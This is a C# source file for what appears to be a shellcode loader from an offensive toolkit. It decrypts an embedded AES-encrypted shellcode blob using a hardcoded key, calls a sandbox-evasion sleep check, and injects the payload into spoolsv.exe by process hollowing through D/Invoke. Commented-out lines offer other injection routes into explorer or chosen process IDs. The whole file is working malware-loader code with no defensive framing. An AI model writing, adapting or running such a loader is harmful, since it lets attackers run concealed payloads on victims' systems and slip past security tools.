using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static AES;
using static SandboxEvasion;


using static ProcessHollowingDinvoke;
//using static ProcessHollowing;
//using static VirtualAllocExNumaThreadExecute;
//using static VirtualAllocThreadExecute;
//using static ProcessInjection;
//using static ProcessInjectionNTDLL;

class ExecutePayload
{

    public ExecutePayload()
    {
        Execute();
    }
    static byte[] get_shellcode()
    {
        byte[] buf = new byte[] { 0x4c, 0x9e, 0x5a, 0xbe, 0xdb, 0x57, 0x70, 0x70, 0x2d, 0x3e, 0xf4, 0x00, 0x6e, 0x56, 0x6e, 0x22, 0x72, 0x0f, 0xdc, 0x98, 0xa1, 0x85, 0xa8, 0x81, 0x4f, 0xb8, 0x2e, 0xab, 0x24, 0x1a, 0xf9, 0x31, 0x5d, 0x90, 0x77, 0x7b, 0x58, 0xf7, 0xcf, 0xca, 0x93, 0x8d, 0x7a, 0x13, 0x2a, 0xc1, 0x8c, 0xc5, 0x14, 0x5c, 0xd9, 0x7a, 0xda, 0xb9, 0x0f, 0xc6, 0xbd, 0x4e, 0x05, 0x0f, 0x6c, 0xd9, 0x33, 0x0b, 0x7f, 0xa0, 0xd6, 0x4f, 0xa6, 0x07, 0x9d, 0x66, 0x3e, 0xef, 0x19, 0xd4, 0x61, 0xa9, 0x6c, 0x12, 0xc6, 0xd7, 0xae, 0x30, 0xef, 0x17, 0xb4, 0x02, 0xfe, 0x04, 0xd5, 0x98, 0x39, 0x0f, 0xc1, 0x63, 0xb9, 0xc8, 0x2a, 0x30, 0x72, 0xf6, 0x85, 0x41, 0x4d, 0x76, 0xf1, 0x17, 0x45, 0x81, 0x76, 0xce, 0x10, 0x4d, 0x01, 0x86, 0x72, 0xfc, 0xeb, 0xb3, 0x77, 0xb4, 0x8b, 0x3f, 0x4c, 0x00, 0xf2, 0x97, 0xa2, 0x97, 0xff, 0x5f, 0xab, 0x80, 0x9e, 0xf0, 0x39, 0x44, 0x53, 0xca, 0x1c, 0x0a, 0xca, 0x04, 0x99, 0x9e, 0x56, 0xb3, 0x74, 0x60, 0xbb, 0x72, 0xd1, 0xb9, 0x98, 0x1c, 0x3c, 0x37, 0x20, 0xd2, 0x9b, 0x41, 0xb3, 0xc1, 0x79, 0xa1, 0xee, 0x34, 0x85, 0xd0, 0x4e, 0x2f, 0x65, 0xaf, 0x90, 0x5a, 0xcf, 0xab, 0xc4, 0x21, 0x17, 0x1b, 0xee, 0x83, 0xfd, 0xe0, 0x6f, 0x97, 0x5c, 0x3f, 0xac, 0x58, 0xf1, 0x71, 0xbd, 0xac, 0x46, 0xa0, 0xc6, 0x43, 0x45, 0x96, 0x84, 0x7c, 0x86, 0x62, 0x87, 0x1a, 0x2e, 0x18, 0x52, 0x80, 0x1e, 0x2a, 0xab, 0x9f, 0xdb, 0x6e, 0xf7, 0x5d, 0x26, 0x6b, 0x23, 0x27, 0x32, 0xbf, 0xba, 0x19, 0xab, 0x0d, 0x40, 0x09, 0xf5, 0xf8, 0x5d, 0xdf, 0x66, 0xb3, 0x27, 0x7c, 0xba, 0x62, 0xc8, 0x3e, 0xa6, 0x98, 0xee, 0x56, 0xce, 0x50, 0x96, 0x82, 0x97, 0x3e, 0xff, 0x52, 0x6a, 0x4c, 0x11, 0xbd, 0x7e, 0xa4, 0x0b, 0x30, 0x6d, 0x3d, 0x77, 0x98, 0x4c, 0x1a, 0xc9, 0xe4, 0x63, 0x70, 0xde, 0xf5, 0xc1, 0xf4, 0x69, 0x43, 0x9d, 0x57, 0x6d, 0x16, 0x2c, 0xbf, 0x35, 0x5c, 0x95, 0xdc, 0xc2, 0x5b, 0x82, 0xdf, 0x05, 0x9e, 0x68, 0x68, 0x5d, 0x95, 0x33, 0x3a, 0xfa, 0xba, 0x2e, 0xc6, 0xf9, 0x71, 0xc5, 0xbd, 0xd1, 0xf1, 0x25, 0x1b, 0x8e, 0x08, 0xd5, 0xce, 0xf6, 0x74, 0xaf, 0xd3, 0x49, 0x65, 0xd4, 0xfb, 0x71, 0x45, 0xd4, 0x4a, 0xfa, 0x2c, 0x47, 0xe7, 0xe6, 0x7a, 0xb8, 0xec, 0xe4, 0x6b, 0xc2, 0x41, 0x1c, 0xe9, 0xe5, 0x82, 0x94, 0x0e, 0xc2, 0xe8, 0x3f, 0x73, 0xc4, 0x85, 0x3e, 0xa7, 0x91, 0x50, 0x7b, 0x14, 0x83, 0x65, 0x7b, 0x30, 0xe0, 0x5d, 0x75, 0xbd, 0x81, 0x26, 0x34, 0xa0, 0xc0, 0xc7, 0xb6, 0x26, 0xe9, 0xf6, 0x89, 0x4b, 0xda, 0xdc, 0x0f, 0x56, 0x04, 0xd5, 0xb3, 0x05, 0x4e, 0xc3, 0xf3, 0x53, 0x39, 0x59, 0xa5, 0x56, 0xc7, 0x19, 0x3e, 0xc0, 0x4e, 0x5b, 0x2c, 0x5b, 0xd9, 0xfd, 0xe7, 0x31, 0x2d, 0x1e, 0x24, 0x92, 0x99, 0x83, 0x66, 0x1e, 0x26, 0xc9, 0x96, 0xb5, 0x4c, 0x9e, 0xeb, 0xf7, 0xa4, 0x7b, 0x66, 0xc5, 0x62, 0x1a, 0x1f, 0x9d, 0x8f, 0x95, 0xc3, 0xcf, 0x15, 0x61, 0x3c, 0xae, 0xd5, 0x1f, 0x09, 0x65, 0xf4, 0x56, 0x3c, 0xfd, 0x05, 0x4f, 0x61, 0x39, 0xb0, 0x61, 0x91, 0xa0, 0x3e, 0xe1, 0x62, 0xe1, 0x9f, 0x81, 0xe3, 0x29, 0x26, 0x58, 0xbc, 0x69, 0xde, 0x99, 0x67, 0x2c, 0x64, 0xb6, 0x8d, 0x5b, 0x6b, 0xb9, 0x80, 0x04, 0x90, 0xca, 0x17, 0x40, 0x06, 0xb6, 0x65, 0xf5, 0x9c, 0x01, 0x7a, 0x8a, 0xf6, 0x4e, 0x76, 0x66, 0xb5, 0xa3, 0x47, 0x1e, 0x55, 0x4d, 0x23, 0x41, 0x57, 0x8b, 0x97, 0x35, 0x10, 0x8e, 0x83, 0x7a };
        return buf;

    }
    public static void Execute()
    {
        byte[] shellcode = get_shellcode();
        byte[] IV = new byte[16] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
        shellcode = AES.AESDecrypt(shellcode, Encoding.ASCII.GetBytes("abcdefghijklmnop"), IV);

        SandboxEvasion.sleep8sec_check();

        ProcessHollowingDinvoke.Execute("spoolsv.exe", shellcode);
        //ProcessHollowing.Execute("calc.exe", shellcode);
        //VirtualAllocExNumaThreadExecute.Execute(shellcode);
        //VirtualAllocThreadExecute.Execute(shellcode);

        //InjectToProcessByName(shellcode,"explorer");
        //InjectToProcessByPID(shellcode, 6248);

        //InjectToProcessNTDLLByName(shellcode, "explorer");
        //InjectToProcessNTDLLByPID(shellcode, 768);
    }
}
